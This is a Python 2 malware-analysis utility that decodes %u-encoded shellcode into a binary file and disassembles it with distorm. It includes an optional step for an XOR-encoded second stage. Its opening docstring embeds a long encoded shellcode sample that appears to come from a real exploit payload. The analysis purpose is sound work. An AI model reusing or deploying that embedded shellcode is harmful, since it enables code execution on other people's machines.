#!/usr/bin/python

'''
sc="%u4341%u4b49%u11EB%u5BFC%u334B%u66C9%ub0B9%u8001%u0B34%uE2f9%uEBFA%uE805%uFFEB%uFFFF%uF911%uF9F9%uA3F9%u72AC%u7815%u9D15%uF9FD%u72F9%u110D%uF869%uF9F9%u0172%u1611%uF9F9%u70F9%u06FF%u91CF%u6254%u2684%uED11%uF9F8%u70F9%uF5BF%uCF06%uD091%u3FEB%u11AF%uF8FC%uF9F9%uBF70%u06E9%u91CF%uC5A0%u82FE%u0F11%uF9F9%u70F9%uEDBF%uCF06%u8791%u1B21%u118A%uF91E%uF9F9%uBF70%uCACD%u1230%u72FA%uC5B7%u387A%uA8FD%uF993%u06A8%uF5AF%u7AA0%u0601%u098D%uB9C4%uF9E6%u8FF9%u7010%uC5B7%uF993%uF993%uF993%uFB93%uF993%u8F06%u06C5%uE9AF%uBF70%u7ABD%uF901%u328D%uF993%uF993%uF993%uFD93%u8F06%u06BD%uEDAF%uBF70%u7AB1%uF901%u4C8D%uC178%uA9DC%uBFBD%uB772%u8CC5%u7854%uF941%uF9EB%uA9F9%uA99D%u8CBD%u7858%uFD41%uF9EB%u16F9%u1307%u8C57%u406C%uFFF9%uF9F9%u1578%uF1F9%uF9F9%uAEAF%u0972%u3F78%uEBE9%uF9F9%u3D72%u397A%u72F1%u0A01%u405D%uFFF9%uF9F9%uB0B0%uB0B0%uCD78%u17F1%u0707%u7C16%u8C30%uA608%u06A7%uC58F%u8F06%u06B1%uBD8F%u1906%uAFAC%u589D%uF9C9%uF9F9%u397C%uEA81%u72C7%uF5B9%u72C7%uE589%u72C7%uF1A7%uC754%u9172%u12F1%uC7F4%uB972%uC7CD%u5172%uF941%uF9F9%u22CA%u3C72%uA4A7%uFD3B%uAAF9%uAFAC%uCFAE%u9572%uE1DD%u72CF%uC5BC%u72CF%uFCAD%uFA81%uC72C%uB372%uC7E1%uA372%uFAD9%u1A24%uB0C5%u72C7%u72CD%u0CFA%u06CA%uCA05%u5539%u3DC3%uFE8D%u3638%uFAF4%u1201%uCF0B%u85C2%uEDDD%u268C%u3B72%u397A%uC7DD%uE172%u24FA%uC79F%uF572%uC7B2%uA372%uFAE5%uC724%uFD72%uFA72%u123C%uCAFB%u7239%uA62C%uA4A7%u3BA2%uF9F1%uF911%uF9F9%uA1F9%u397A%u3AFC"
'''

import os, sys
import re

try:
    from distorm import Decode, Decode16Bits, Decode32Bits, Decode64Bits
except ImportError:
    print 'distorm is not installed, see https://code.google.com/p/distorm/'
    sys.exit()

# the first argument is Unicode-encoded shellcode or a file 
if len(sys.argv) != 2:
    print 'Usage: %s <file|shellcode>' % sys.argv[0]
    sys.exit()
    
if os.path.isfile(sys.argv[1]):
    sc = open(sys.argv[1]).read()
else:
    sc = sys.argv[1]

# translate to binary
bin_sc = re.sub('%u(..)(..)',lambda x: chr(int(x.group(2),16))+chr(int(x.group(1),16)), sc)

# remove the comment from the lines below in order to  
# support disassembly of the second stage payload 
'''
from xortools import single_byte_xor
new_sc  = bin_sc[0:0x1c]
new_sc += single_byte_xor(bin_sc[0x1c:0x1c+0x1b0], 0xf9) 
bin_sc = new_sc
'''

# save to disk 
try:
    FILE = open("shellcode.bin", "wb")
    FILE.write(bin_sc)
    FILE.close()
except Exception, e:
    print 'Cannot save binary to disk: %s' % e

# disassemble the binary data
l = Decode(0, bin_sc, Decode32Bits)
for i in l:
	print "0x%08x (%02x) %-20s %s" % (i[0], i[1], i[3], i[2])

